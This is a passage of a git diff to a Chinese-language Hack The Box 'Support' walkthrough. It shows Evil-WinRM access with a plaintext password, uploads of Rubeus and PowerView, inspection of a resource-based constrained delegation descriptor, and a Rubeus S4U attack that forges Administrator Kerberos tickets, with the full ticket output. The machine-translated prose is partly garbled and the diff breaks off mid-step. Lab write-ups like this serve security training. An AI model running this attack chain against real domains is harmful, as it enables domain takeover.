@@ -608,7 +608,7 @@ CHANGELOG.md  LICENSE  README.md  Rubeus  Rubeus.sln  Rubeus.yar
 [★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
 
 *Evil-WinRM* PS C:\Users\support\Documents> upload Rubeus.exe
-*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
+*Evil-WinRM* PS C:\Users\support\Documents> upload Powermad.ps1
                                         
 *Evil-WinRM* PS C:\Users\support\Documents> . ./Powermad.ps1
 ```
@@ -647,7 +647,7 @@ UserPrincipalName :
 DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
 DNSHostName                          : dc.support.htb
 Enabled                              : True
-Name                                 : DC
+Name                                 : DC //DC 对 FAKE-COMP01 开启了 RBCD（资源约束委派）
 ObjectClass                          : computer
 ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
 PrincipalsAllowedToDelegateToAccount : {CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb}
@@ -656,4 +656,223 @@ SID                                  : S-1-5-21-1677581083-3380853377-188903654-
 UserPrincipalName                    :
 ```
 #### 如我们所见，PrincipalsAllowedToDelegateToAccount被设置为FAKE-COMP01，这意味着指挥工作。我们还可以验证代表其他身份的msds-allow的值。
-#### 正如我们所看到的，代表其他标识的msds- allowedtoaction现在有了一个值，但是因为类型这个属性是原始安全描述符，我们必须将字节转换为字符串才能理解发生什么事了。首先，让我们获取所需的值并将其转储到一个名为RawBytes的变量中。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> ls
+
+
+    Directory: C:\Users\support\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          2/1/2026   9:23 PM         135576 Powermad.ps1
+-a----          2/1/2026   9:23 PM         770279 PowerView.ps1
+-a----          2/1/2026   9:25 PM         515584 Rubeus.exe
+-a----          2/1/2026   9:25 PM        1046528 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\support\Documents> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
+
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+
+//DC（域控）已经被配置了“资源约束委派（RBCD）
+```
+#### 正如我们所看到的，代表其他标识的msds-allowedtoaction现在有了一个值，但是因为类型这个属性是原始安全描述符，我们必须将字节转换为字符串才能理解发生什么事了。首先，让我们获取所需的值并将其转储到一个名为RawBytes的变量中。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+```
+#### 然后，让我们将这些字节转换为Raw Security Descriptor对象。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+```
+#### 最后，我们可以打印整个安全描述符以及DiscretionaryAcl类表示访问控制列表，该列表指定可以代表DC进行操作的计算机
+```
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor
+
+
+ControlFlags           : DiscretionaryAclPresent, SelfRelative
+Owner                  : S-1-5-32-544
+Group                  :
+SystemAcl              :
+DiscretionaryAcl       : {System.Security.AccessControl.CommonAce}
+ResourceManagerControl : 0
+BinaryLength           : 80
+
+
+
+*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl
+
+
+BinaryLength       : 36
+AceQualifier       : AccessAllowed
+IsCallback         : False
+OpaqueLength       : 0
+AccessMask         : 983551
+SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-6101
+AceType            : AccessAllowed
+AceFlags           : None
+IsInherited        : False
+InheritanceFlags   : None
+PropagationFlags   : None
+AuditFlags         : None
+```
+#### 从输出中我们可以看到，SecurityIdentifier被设置为我们看到的FAKE-COMP01的SID将AceType设置为AccessAllowed。
+### Performing a S4U Attack //S4U攻击
+#### 现在是执行S4U攻击的时候了，这将允许我们获得代表的Kerberos票据管理员。我们会让鲁伯斯来执行这次攻击。首先，我们需要用于创建计算机对象的密码的散列。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Password123
+[*] Input username             : FAKE-COMP01$
+[*] Input domain               : support.htb
+[*] Salt                       : SUPPORT.HTBhostfake-comp01.support.htb
+[*]       rc4_hmac             : 58A478135A93AC3BF058A5EA0E8FDB71
+[*]       aes128_cts_hmac_sha1 : 06C1EABAD3A21C24DF384247BC85C540
+[*]       aes256_cts_hmac_sha1 : FF7BA224B544AA97002B2BEE94EADBA7855EF81A1E05B7EB33D4BCD55807FF53
+[*]       des_cbc_md5          : 5B045E854358687C
+
+
+```
+#### 我们需要获取名为rc4 hmac的值。接下来，我们可以为Administrator生成Kerberos票据。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:FAKE-COMP01$
+/rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
+[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE-COMP01$'
+[*] Using domain controller: ::1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'FAKE-COMP01$@SUPPORT.HTB'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2self request to ::1:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'FAKE-COMP01$@SUPPORT.HTB'
+[*] base64(ticket.kirbi):
+
+      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
+      MA4bDEZBS0UtQ09NUDAxJA==
+
+[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
+[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2proxy request to domain controller ::1:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
+
+      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
+      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
+[+] Ticket successfully imported!
+*Evil-WinRM* PS C:\Users\support\Documents> 
+
+```
+#### Rubeus成功地弄到了票。现在，我们可以获取最后一个Base64编码的票证，并将其用于我们的以管理员身份在本地机器上获取DC上的shell。为此，复制最后一张票的值和将其粘贴到一个名为ticket.kirbi.b64的文件中。
+#### 注意：在将值粘贴到文件之前，请确保从值中删除任何空白字符。接下来，创建一个名为ticket的新文件。使用前一张彩票的Base64解码值
+```
+[★]$ vi ticket.kirbi.b64
+[★]$ tr -d ' \n\r\t' < ticket.kirbi3.b64  > clean.b64
+
